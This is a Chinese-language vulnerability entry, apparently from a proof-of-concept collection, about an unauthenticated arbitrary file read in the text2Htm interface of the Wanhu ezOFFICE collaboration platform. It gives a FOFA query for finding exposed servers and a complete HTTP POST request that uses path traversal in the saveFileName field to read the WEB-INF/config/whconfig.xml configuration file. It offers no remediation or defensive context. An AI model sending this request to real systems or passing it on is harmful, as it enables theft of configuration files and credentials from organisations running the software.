## 万户ezoffice text2Htm任意文件读取漏洞

>万户ezOFFICE协同管理平台是一个综合信息基础应用平台分为企业版和政务版。解决方案由五大应用、两个支撑平台组成，分别为知识管理、工作流程、沟通交流、辅助办公、集成解决方案及应用支撑平台、基础支撑平台。

## 简介

万户ezOFFICE协同管理平台text2Htm接口处存在任意文件读取漏洞，未经身份认证的攻击者可以通过此漏洞读取敏感文件。

## 漏洞类型

任意文件读取

## 网络绘测

### fofa

```
app="ezOFFICE协同管理平台"
```

## POC

```http

POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Connection: close
Content-Length: 75
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
SL-CE-SUID: 1081

saveFileName=1/../../../../WEB-INF/config/whconfig.xml&moduleName=html
```

